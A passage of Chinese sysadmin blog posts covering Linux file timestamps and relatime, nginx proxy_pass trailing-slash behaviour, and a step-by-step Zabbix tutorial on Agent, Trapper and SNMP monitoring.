<h3 id="3-3-修改文件"><a href="#3-3-修改文件" class="headerlink" title="3.3 修改文件"></a>3.3 修改文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@centos7 time]# stat issue                           #先获取下3个time</span><br><span class="line">  File: ‘issue’</span><br><span class="line">  Size: 65            Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 805h/2053d    Inode: 261123      Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: unconfined_u:object_r:etc_runtime_t:s0</span><br><span class="line">Access: 2017-11-11 09:03:49.080931626 +0800</span><br><span class="line">Modify: 2017-11-11 09:04:16.881930331 +0800</span><br><span class="line">Change: 2017-11-11 09:04:16.881930331 +0800</span><br><span class="line"> Birth: -</span><br><span class="line">[root@centos7 time]# echo &quot;hello&quot; &gt;&gt; issue                #修改文件</span><br><span class="line">[root@centos7 time]# stat issue 　　　　　　　　　　　　　　  #再次查看三个time</span><br><span class="line">  File: ‘issue’</span><br><span class="line">  Size: 71            Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 805h/2053d    Inode: 261123      Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: unconfined_u:object_r:etc_runtime_t:s0</span><br><span class="line">Access: 2017-11-11 09:03:49.080931626 +0800</span><br><span class="line">Modify: 2017-11-11 09:05:07.775927960 +0800</span><br><span class="line">Change: 2017-11-11 09:05:07.775927960 +0800</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<p>通过上面的实验，我们可以看出来，写文件操作不会导致atime(访问时间）的修改，但是mtime和ctime会发生修改。mtime修改了我们可以理解的，毕竟我们修改了文件的，</p>
<p>那为何ctime也修改了呢， 仔细可以发现我们文件的大小发生了变化，也就是元数据发生了变化，所以ctime也是要变化的。</p>
<h3 id="3-4-修改文件所有者"><a href="#3-4-修改文件所有者" class="headerlink" title="3.4 修改文件所有者"></a>3.4 修改文件所有者</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 time]# stat issue                                          #先查看下3个time </span><br><span class="line">  File: ‘issue’</span><br><span class="line">  Size: 71            Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 805h/2053d    Inode: 261123      Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)</span><br><span class="line">Context: unconfined_u:object_r:etc_runtime_t:s0</span><br><span class="line">Access: 2017-11-11 09:03:49.080931626 +0800</span><br><span class="line">Modify: 2017-11-11 09:05:07.775927960 +0800</span><br><span class="line">Change: 2017-11-11 09:05:07.775927960 +0800</span><br><span class="line"> Birth: -</span><br><span class="line">[root@centos7 time]# chown zhaojiedi issue                              #修改权限</span><br><span class="line">[root@centos7 time]# stat issue 　　　　　　　　　　　　　　　　　　　　　　　 #再次查看3个时间</span><br><span class="line">  File: ‘issue’</span><br><span class="line">  Size: 71            Blocks: 8          IO Block: 4096   regular file</span><br><span class="line">Device: 805h/2053d    Inode: 261123      Links: 1</span><br><span class="line">Access: (0644/-rw-r--r--)  Uid: ( 1000/zhaojiedi)   Gid: (    0/    root)</span><br><span class="line">Context: unconfined_u:object_r:etc_runtime_t:s0</span><br><span class="line">Access: 2017-11-11 09:03:49.080931626 +0800</span><br><span class="line">Modify: 2017-11-11 09:05:07.775927960 +0800</span><br><span class="line">Change: 2017-11-11 09:12:42.076906795 +0800</span><br><span class="line"> Birth: -</span><br></pre></td></tr></table></figure>

<p>通过上面的实验，我们可以看出来，修改了权限后，文件ctime发生了变化。</p>
<h2 id="说说relatime"><a href="#说说relatime" class="headerlink" title="说说relatime"></a>说说relatime</h2><p>常用命令对三个time的修改情况我们上面的测试，可以看出来，每次访问文件都会更新atime,这是很耗时的，尤其在web服务器上，大量用户只是访问html页面，完全没有必要修改atime。</p>
<p>从kernel2.6.29开始，文件系统默认集成了一个relatime的属性。</p>
<p>那么啥时候更新atime呢？ 有2种情况会更新atime,第一种是mtime比atime新，第二种是上次访问是1天前的了。</p>
<h2 id="常用命令对三个time的修改情况"><a href="#常用命令对三个time的修改情况" class="headerlink" title="常用命令对三个time的修改情况"></a>常用命令对三个time的修改情况</h2><p>上面我们做了3个测试，我们也对atime,mtime,ctime有了一定的了解。网上有人已经做了好多测试如下表。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">+-------------------------------------------------+</span><br><span class="line">   |               |  timestamps marked for update   |</span><br><span class="line">   |    syscall    |---------------------------------|</span><br><span class="line">   |               |       file        | parent dir  |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [2]chdir      |                   |             |</span><br><span class="line">   |---------------| -                 | -           |</span><br><span class="line">   | [3]fchdir     |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [4]chmod      |                   |             |</span><br><span class="line">   |---------------| ctime             | -           |</span><br><span class="line">   | [5]fchmod     |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [6]chown      |                   |             |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [7]fchown     | ctime             | -           |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [8]lchown     |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [9]close      | -                 | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [10]creat     | atime,ctime,mtime | ctime,mtime |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [11]execve    | atime             | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [12]fcntl     | -                 | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [13]ftruncate |                   |             |</span><br><span class="line">   |---------------| ctime,mtime       | -           |</span><br><span class="line">   | [14]truncate  |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [15]fstat     |                   |             |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [16]stat      | -                 | -           |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [17]lstat     |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [18]fsync     |                   |             |</span><br><span class="line">   |---------------| -                 | -           |</span><br><span class="line">   | [19]fdatasync |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [20]link      | ctime             | ctime,mtime |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [21]lseek     | -                 | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [22]mknod     | atime,ctime,mtime | ctime,mtime |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [23]mkdir     | atime,ctime,mtime | ctime,mtime |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [24]mmap      | *                 | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [25]munmap    | -                 | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [26]msync     | *                 | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [27]open      | *                 | *           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [28]pread     |                   |             |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [29]read      | atime             | -           |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [30]readv     |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [31]pwrite    |                   |             |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [32]write     | ctime,mtime       | -           |</span><br><span class="line">   |---------------|                   |             |</span><br><span class="line">   | [33]writev    |                   |             |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [34]rename    | implementation    | ctime,mtime |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [35]rmdir     | -                 | ctime,mtime |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [36]readlink  | *                 | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [37]readdir   | atime             | -           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | readahead     | ?                 | ?           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [38]symlink   | *                 | *           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | sendfile      | ?                 | ?           |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [39]unlink    | -                 | ctime,mtime |</span><br><span class="line">   |---------------+-------------------+-------------|</span><br><span class="line">   | [40]utime     | ctime             | -           |</span><br><span class="line">   +-------------------------------------------------+</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>运维技术</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>proxy_pass后加不加斜杠的区别</title>
    <url>/articles/98a39ceb.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在nginx中配置proxy_pass时，当在后面的url上加不加/，区别是如此的大呢。</p>
<p>如加上了/，相当于是绝对根路径，则nginx不会把location中匹配的路径部分代理走;</p>
<p>如果没有加/，则会把匹配的路径部分也给代理走。 </p>
<a id="more"></a>

<h2 id="Location的目录匹配详解"><a href="#Location的目录匹配详解" class="headerlink" title="Location的目录匹配详解"></a>Location的目录匹配详解</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">没有“/”时，可以模糊匹配字符串本身和后面所有</span><br><span class="line">例如：location /abc/def可以匹配/abc/defghi请求，也可以匹配/abc/def/ghi等</span><br><span class="line"></span><br><span class="line">而有“/”时，只能匹配后面</span><br><span class="line">例如：location /abc/def/不能匹配/abc/defghi请求，只能匹配/abc/def/anything这样的请求</span><br></pre></td></tr></table></figure>

<h2 id="Proxy-pass后url区别详解"><a href="#Proxy-pass后url区别详解" class="headerlink" title="Proxy_pass后url区别详解"></a>Proxy_pass后url区别详解</h2><p>下面四种情况分别用<a href="http://192.168.1.4/proxy/test.html" target="_blank" rel="noopener">http://192.168.1.4/proxy/test.html</a> 进行访问。</p>
<h3 id="第一种：加"><a href="#第一种：加" class="headerlink" title="第一种：加/"></a><strong>第一种：加/</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location  /proxy/ &#123;</span><br><span class="line">		proxy_pass http://127.0.0.1:81/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结论：会被代理到<a href="http://127.0.0.1:81/test.html" target="_blank" rel="noopener">http://127.0.0.1:81/test.html</a> 这个url</p>
<h3 id="第二种-不加"><a href="#第二种-不加" class="headerlink" title="第二种: 不加/"></a><strong>第二种: 不加/</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location  /proxy/ &#123;</span><br><span class="line">		proxy_pass http://127.0.0.1:81;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结论：会被代理到<a href="http://127.0.0.1:81/proxy/test.html" target="_blank" rel="noopener">http://127.0.0.1:81/proxy/test.html</a> 这个url</p>
<h3 id="第三种-加目录加-："><a href="#第三种-加目录加-：" class="headerlink" title="第三种:  加目录加/："></a><strong>第三种:  加目录加/</strong>：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location  /proxy/ &#123;</span><br><span class="line">		proxy_pass http://127.0.0.1:81/ftlynx/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结论：会被代理到<a href="http://127.0.0.1:81/ftlynx/test.html" target="_blank" rel="noopener">http://127.0.0.1:81/ftlynx/test.html</a> 这个url。</p>
<h3 id="第四种：加目录不加-："><a href="#第四种：加目录不加-：" class="headerlink" title="第四种：加目录不加/："></a><strong>第四种：加目录不加/</strong>：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location  /proxy/ &#123;</span><br><span class="line">		proxy_pass http://127.0.0.1:81/ftlynx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结论：会被代理到<a href="http://127.0.0.1:81/ftlynxtest.html" target="_blank" rel="noopener">http://127.0.0.1:81/ftlynxtest.html</a> 这个url</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>location目录字符串后加/，就只能匹配后面，不加不仅可以匹配后面还可字符串模糊匹配。</p>
<p>proxy_pass加/, 代理地址就不加location匹配目录; 不加/，代理直接就加目录。</p>
]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>详解zabbix的监控方式</title>
    <url>/articles/99653f69.html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>zabbix支持的主要监控方式：</p>
<p>​        zabbix主要Agent，Trapper，SNMP，JMX，IPMI这几种监控方式，本文章主要通过监控理论和实际操作测试等方式来简单介绍这几种方式的监控原理和优缺点等 。下面对几种监控方式的监控原理进行介绍：</p>
<a id="more"></a>

<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><h3 id="Agent监控方式"><a href="#Agent监控方式" class="headerlink" title="Agent监控方式"></a>Agent监控方式</h3><p>​        在Agent监控方式下，zabbix-agent会主动收集本机的监控信息并通过TCP协议与zabbix-server传递信息。Agent监控方式分为主动和被动模式。在被动模式下，zabbix-agent监听10050端口，等待zabbix-server的监控信息收集信息请求；在主动模式下，zabbix-agent收集监控信息并通过10050端口主动将数据传给zabbix-server所在服务器的10051端口。</p>
<p>​        优点：</p>
<p>​                （1）是zabbix最常用的监控方式，监测指标深入细致有针对性。</p>
<p>​                （2）内置监控功能强大，内置监控项目丰富。</p>
<p>​                （3）TCP方式实现通讯，可靠性也有保证。</p>
<p>​        缺点：</p>
<p>​                （1）需要在被监控机器上安装zabbix-agent客户端，部署相对麻烦，最初需要逐个机器安装代理软件</p>
<p>​                （2）zabbix-agent客户端运行在被监控机上，会收集本机信息</p>
<h3 id="Trapper监控方式"><a href="#Trapper监控方式" class="headerlink" title="Trapper监控方式"></a>Trapper监控方式</h3><p>​        Trapper监控方式使用zabbix-sender程序主动向zabbix-server发送数据。key的名称和发送的数据内容都可以灵活定义。发送的信息采用JSON格式，遵循zabbix-sender协议。可以自定义脚本利用zabbix-sender协议来zabbix-server发送信息。</p>
<p>​        优点：</p>
<p>​                （1）不需要在被监控机器上安装zabbix-agent</p>
<p>​                （2）不收集被监控机器的信息</p>
<p>​                （3）可以自定义发送的信息内容</p>
<p>​                （4）可以使用自定义脚本发送信息</p>
<p>​        缺点：</p>
<p>​                （1）需要自定义发送的信息内容</p>
<p>​                （2）无内置监控项目</p>
<h3 id="SNMP监控方式"><a href="#SNMP监控方式" class="headerlink" title="SNMP监控方式"></a>SNMP监控方式</h3><p>​        SNMP全称Simple Network Management Protocol，即网络管理协议，包括进程管理和被管理设备两部分。作为一种国际通用的网络管理协议被广泛的应用于各种交换机，路由器等网络设备的管理上，而现在也越来越多被用于对服务器的监控上。</p>
<p>​        优点：</p>
<p>​                （1）服务器一旦部署SNMPAgent，任何能实现SNMP协议的软件都可以对其进行监测。</p>
<p>​                （2）通过这种手段进行监测不需知道被监测服务器的用户名和密码，比较安全。</p>
<p>​        缺点：</p>
<p>​                （1）很多服务器并非默认安装SNMPAgent，如果通过这种方式监测则需要对所有服务器安装部署。</p>
<p>​                （2）能监测的参数指标比较固定不够深入，无法满足用户的特殊需求。</p>
<p>​                （3）由于SNMP协议是通过UDP方式实现的。在网络状况不佳的情况下其可靠性能以保证。</p>
<h3 id="JMX监控方式"><a href="#JMX监控方式" class="headerlink" title="JMX监控方式"></a>JMX监控方式</h3><p>​        JMX，全称Java Management Extensions，即Java管理拓展，是Java平台为应用程序，设备，系统等植入管理功能的框架。在zabbix中，JMX数据的获取由zabbix-java-gateway代理程序来负责数据的采集。</p>
<p>​        优点：</p>
<p>​                （1）可以详细的监控各类Java程序的运行状态</p>
<p>​        缺点：</p>
<p>​                （1）被监控机上需要安装zabbix-java-gateway</p>
<h3 id="IPMI监控方式"><a href="#IPMI监控方式" class="headerlink" title="IPMI监控方式"></a>IPMI监控方式</h3><p>​        IPMI，全称Interlligent Platform Management Interface，即智能平台管理接口，原本是Intel架构中企业系统的周边设备所采用的一种工业标准，以后成为业界通用的标准。用户可以利用IPMI监控服务器的物理特性，如温度，电压，电扇工作状态，电源供应以及机箱***等指标。</p>
<p>​        根据以上对zabbix各主要监控方式的梳理，结论如下：</p>
<p>​        （1）根据被监控机器的环境和客户要求选用适当的监控方式，可同时配合多种监控方式。</p>
<p>​        （2）有条件在监控机上部署zabbix-agent客户端时，该方法为第一选择，因为其功能强大且配置相对简便。</p>
<p>​        （3）需要自定义脚本或者监控信息时，可使用Trapper方式，即使用zabbix-sender程序或者自定义脚本遵循zabbix-sender协议，已JSON形式，通过TCP发送自定义信息。</p>
<h2 id="方式的实现"><a href="#方式的实现" class="headerlink" title="方式的实现"></a>方式的实现</h2><h3 id="Agent监控方式-1"><a href="#Agent监控方式-1" class="headerlink" title="Agent监控方式"></a>Agent监控方式</h3><h4 id="1、通过Agent方式监控Linux服务器"><a href="#1、通过Agent方式监控Linux服务器" class="headerlink" title="1、通过Agent方式监控Linux服务器"></a>1、通过Agent方式监控Linux服务器</h4><p>​        （1）需要在Linux服务器上安装zabbix-agent客户端安装包，需要先导入软件安装源:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh http://repo.zabbix.com/zabbix/3.5/rhel/7/x86_64/zabbix-release-3.5-1.el7.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>​       （2） 使用yum源安装zabbix-agent    </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install zabbix-agent</span><br></pre></td></tr></table></figure>

<p>​        （3）zabbix客户端配置</p>
<p>​        编辑zabbix_server配置文件并启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/zabbix/zabbix_agent.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">修改以下配置信息：</span></span><br><span class="line"></span><br><span class="line">Server=192.168.40.134      #zabbix服务端IP地址</span><br><span class="line"></span><br><span class="line">ServerActive=192.168.40.134    #zabbix服务端IP地址</span><br><span class="line"></span><br><span class="line">ListenPort=10050          #监控服务端口</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">启动zabbix-agent服务</span></span><br><span class="line"></span><br><span class="line">systemctl start zabbix-agent</span><br></pre></td></tr></table></figure>

<p>​        （4）zabbix服务器端添加被监控主机</p>
<p>​        选择“配置”-“主机”，然后选择“创建主机”:        <img src="/articles/99653f69/1.png" alt="image.png"></p>
<p>​        选择添加的模板：        <img src="/articles/99653f69/2.png" alt="image.png"></p>
<p>​        添加主机成功：</p>
<p><img src="/articles/99653f69/3.png" alt="image.png"></p>
<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="2、通过Agent方式监控windows服务器"><a href="#2、通过Agent方式监控windows服务器" class="headerlink" title="2、通过Agent方式监控windows服务器"></a>2、通过Agent方式监控windows服务器</h4><p>​        （1）下载Windows的zabbix客户端</p>
<p>​        下载地址：<a href="https://www.zabbix.com/download_agents" target="_blank" rel="noopener">Zabbix官网</a></p>
<p>​        选择需要下载的windows版本客户端：</p>
<p><img src="/articles/99653f69/4.png" alt="image.png">         </p>
<p> （2）确定被监控主机的系统是32位还是64位</p>
<p>​        右键“此电脑”，查看操作系统版本.</p>
<p>​        <img src="/articles/99653f69/5.png" alt="image.png"></p>
<p>（3）windows上安装agent</p>
<p>​            根据系统信息直接选择msi或zip压缩包，在此需要注意和server端一致。然后解压安装即可.</p>
<p>（4）修改配置文件</p>
<p>​        需要修改的内容为：LogFile、Server、Hostname、ServerActive这几个参数。具体配置如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Server=192.168.40.134</span><br><span class="line">ServerActive=192.168.40.134</span><br><span class="line">Hostname=Windows host </span><br><span class="line">ListenPort=10050</span><br></pre></td></tr></table></figure>

<p>（5）安装zabbix-agent客户端程序</p>
<p>​        用管理员权限打开CMD，进入到zabbix的应用程序目录，执行安装命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zabbix_agentd.exe -c D:\zabbix-agent\conf\zabbix_agentd.win.conf -i</span><br></pre></td></tr></table></figure>

<p>​        安装成功后，执行运行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zabbix_agentd.exe -c D:\zabbix-agent\conf\zabbix_agentd.win.conf -s</span><br></pre></td></tr></table></figure>

<p>​      <img src="/articles/99653f69/6.png" alt="image.png"></p>
<p> （6）在zabbix server端配置agent</p>
<p>​        在server端，选择 配置-主机 界面，然后点击“创建主机”，在添加主机的界面，输入被监控主机客户端的信息。</p>
<p><img src="/articles/99653f69/7.png" alt="image.png"></p>
<p>​        点击“添加”，然后过一段时间查看主机状态</p>
<p><img src="/articles/99653f69/8.png" alt="image.png"></p>
<p>​    </p>
<h3 id="zabbix-Trapper监控方式"><a href="#zabbix-Trapper监控方式" class="headerlink" title="zabbix Trapper监控方式"></a>zabbix Trapper监控方式</h3><h4 id="1、zabbix-Trapper-工作原理"><a href="#1、zabbix-Trapper-工作原理" class="headerlink" title="1、zabbix Trapper 工作原理"></a>1、zabbix Trapper 工作原理</h4><p>​        zabbix获取数据时有时会出现超时，如果一些数据需要执行较长的时间才能获取的话，那么zabbix会出现异常，考虑到这种情况，zabbix增加了Trapper功能，客户端自己提交数据给zabbix。</p>
<p>​        Trapper是被监控主机主动发送数据给zabbix server，与主动模式的区别是不需要安装客户端；Trapper方式发送数据是以主机名处理，不是IP地址，所以主机名要唯一。在配置监控项时候Type of information项要选择text，否则会报not support错误。</p>
<p>​        Trapper工作模式中，使用zabbix监控类型zabbix Trapper（可以称为zabbix捕捉器），在zabbix服务器上必须有一个捕捉项目，然后需要配合zabbix_sender把数据推送给zabbix服务器，该程序由zabbix发行版本自带，源码包解压后在bin目录下，配合crontab定期发送数据给zabbix server。</p>
<p>​        zabbix_sender是一个命令行工具，可以用来发送zabbix服务器处理性能数据。该工具通常用于长时间运行的用户 脚本，用于定期发送可用性和性能数据。</p>
<h4 id="2、zabbix-sender命令："><a href="#2、zabbix-sender命令：" class="headerlink" title="2、zabbix_sender命令："></a>2、zabbix_sender命令：</h4><p>​        rpm导入zabbix_sender安装源：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -ivh http://repo.zabbix.com/zabbix/3.5/rhel/7/x86_64/zabbix-release-3.5-1.el7.noarch.rpm</span><br></pre></td></tr></table></figure>

<p>​        <img src="/articles/99653f69/9.png" alt="image.png"></p>
<p>​        使用rpm安装，默认在/bin目录下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /bin</span><br><span class="line">ls</span><br><span class="line">./zabbix_sender</span><br><span class="line"></span><br><span class="line">​ usage:zabbix_sender [-Vhv] &#123;[-zpsl] -ko | [-zpl] -T -i &lt;file&gt; -r&#125; [-c&lt;file&gt;]</span><br><span class="line"></span><br><span class="line">​ 参数说明：</span><br><span class="line">​ -c --config&lt;file&gt;       配置文件绝对路径</span><br><span class="line">​ -z --zabbix-server&lt;server&gt;   zabbix server的IP地址</span><br><span class="line">​ -p --port&lt;server port&gt;   zabbix server 端口默认10051</span><br><span class="line">​ -s --host &lt;hostname&gt;   主机名，zabbix客户端zabbix.agentd.conf配置文件中定义的Hostname（不是服务器的hostname），不是客户端主机的IP地址</span><br><span class="line">​ -l -- source-address &lt;IP address&gt;  源IP</span><br><span class="line">​ -k --key &lt;key&gt;  监控项的key值</span><br><span class="line">​ -o --value&lt;key value&gt; key值</span><br><span class="line">​ -i --input-file&lt;input file&gt;  从文件里面读取hostname、key、value一行为一条数据，使用空格作为分隔符，如果主机名带空格，那么请使用双引号包起来</span><br><span class="line">​ -T --with-timestamps   一行一条数据，空格作为分隔符：&lt;hostname&gt; &lt;key&gt; &lt;timestamp&gt; &lt;value&gt;，配合 --input-file option，timestamp为unix时间戳</span><br><span class="line">​ -r --real-time      将数据实时提交给服务器</span><br><span class="line">​ -v --verbose     详细模式， -vv 更详细</span><br></pre></td></tr></table></figure>

<h4 id="3、监控项配置"><a href="#3、监控项配置" class="headerlink" title="3、监控项配置"></a>3、监控项配置</h4><p>​        创建监控项（Configuration –&gt; Template –&gt; Items –&gt; Create item 或Configuration –&gt; Host –&gt; Items –&gt; Create item）</p>
<p>​        （1）选择“配置”-“主机”-“新建主机”,添加zabbix-Trapper 客户端的用户名：        <img src="/articles/99653f69/10.png" alt="image.png"></p>
<p>​       （2） 添加完主机后，添加监控项，选择刚添加的主机，点击“监控项”，然后点击“创建监控项”：</p>
<p>​        添加监控信息，然后点击更新：</p>
<p>​    <img src="/articles/99653f69/11.png" alt="image.png"></p>
<p>​        （3）客户端使用zabbix_sender发送数据</p>
<p>​          客户端设备操作：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> cd /bin</span><br><span class="line">./zabbix_sender -s 192.168.40.134 -z 192.168.40.129 -k trappertest11 -o test</span><br></pre></td></tr></table></figure>

<p>​        -vv 可以显示具体信息，这里提示无法连接到zabbix server的10051端口</p>
<p>​        服务端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -anop | grep -i zabbix</span><br></pre></td></tr></table></figure>

<p>​         未开放外网的10051端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ListenIP=127.0.0.1,192.168.40.134</span><br><span class="line">LIstenPort=10051</span><br><span class="line"></span><br><span class="line">systemctl restart zabbix-service</span><br><span class="line">netstat -anop | grep -i zabbix</span><br></pre></td></tr></table></figure>

<p>​        客户端：        <img src="/articles/99653f69/12.png" alt="image.png"></p>
<p>​       </p>
<h3 id="Zabbix-SNMP监控方式"><a href="#Zabbix-SNMP监控方式" class="headerlink" title="Zabbix SNMP监控方式"></a>Zabbix SNMP监控方式</h3><h4 id="1、SNMP监控介绍"><a href="#1、SNMP监控介绍" class="headerlink" title="1、SNMP监控介绍"></a>1、SNMP监控介绍</h4><p>​        如果要监控打印机、路由器、交换机、UPS等设备，肯定不能使用zabbix agentd，因为他们不能安装软件，但是一般都支持SNMP协议，可以使用SNMP来监控。SNMP检查基于UDP协议。</p>
<p>​        注意事项：如果监控基于SNMPv3协议的设备，确保msgAuthoritativeEngineID（通常叫做snmpEngineID或“Engine ID”）是唯一的。        </p>
<p>​                        以前SNMPv3协议只支持MD5和DES加密，从zabbix2.2开始支持SHA与AES加密协议。</p>
<h4 id="2、Zabbix-SNMP监控Linux操作系统"><a href="#2、Zabbix-SNMP监控Linux操作系统" class="headerlink" title="2、Zabbix SNMP监控Linux操作系统"></a>2、Zabbix SNMP监控Linux操作系统</h4><p>​        （1）zabbix服务器端需要先安装SNMP服务</p>
<p>​              使用yum源在线安装SNMP服务配置    </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install net-snmp*</span><br></pre></td></tr></table></figure>

<p>​           (2)  配置SNMP配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/snmp/snmpd.conf</span><br><span class="line"></span><br><span class="line">proc mountd   </span><br><span class="line">proc ntalkd  4</span><br><span class="line">proc sendmail  10  1</span><br><span class="line">disk / 10000</span><br><span class="line">load  12 14  14</span><br><span class="line">view  systemview  included  .1.3.6.1.2.1.1</span><br><span class="line">view  systemview  included  .1.3.6.1.2.1.25.1.1</span><br><span class="line">view  systemview  included  .1</span><br></pre></td></tr></table></figure>

<p>​            (3) 设置开机启动SNMP：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chkconfig  snmpd on</span><br><span class="line">chkconfig --list | grep snmpd</span><br><span class="line">/etc/init.d/snmpd start     启动snmp服务</span><br></pre></td></tr></table></figure>

<p>​        （4）zabbix服务器使用snmpwalk命令测试被监控计算机名</p>
<p>​        2c是指采用SNMP V2版本，192.168.40.134是指监控设备开启了SNMP服务，否则会获取失败，sysName是指被监控设备的计算机名。            </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 2c -c public 192.168.40.134 sysName</span><br></pre></td></tr></table></figure>

<p>​        （5）被监控设备安装SNMP服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install net-snmp*</span><br></pre></td></tr></table></figure>

<p>​        <img src="/articles/99653f69/13.png" alt="image.png"></p>
<p>​       (6) 配置SNMP配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">view    systemview    included   .1.3.6.1.2.1.1</span><br><span class="line">view    systemview    included   .1.3.6.1.2.1.25.1.1</span><br><span class="line">view    systemview    included   .1</span><br></pre></td></tr></table></figure>

<p>​        com2sec notConfigUser  default       zabbix    #zabbix是被监控的团体名   public团体名称可以修改成自己设置的字符串也可以使用默认public，default字符串默认是所有IP地址都可以访问，如果把default修改成192.168.40.134（zabbix服务器IP地址），表示只允许zabbix服务器访问这台被监控电脑的SNMP服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl  enable snmped</span><br><span class="line">systemctl stop firewalld   关闭防火墙</span><br><span class="line">/etc/init.d/snmpd start    启动SNMP服务 </span><br><span class="line">systemctl stop firewalld   关闭防火墙</span><br></pre></td></tr></table></figure>

<p>​        /etc/init.d/snmpd start    启动SNMP服务</p>
<p>（7）zabbix服务端web界面添加主机</p>
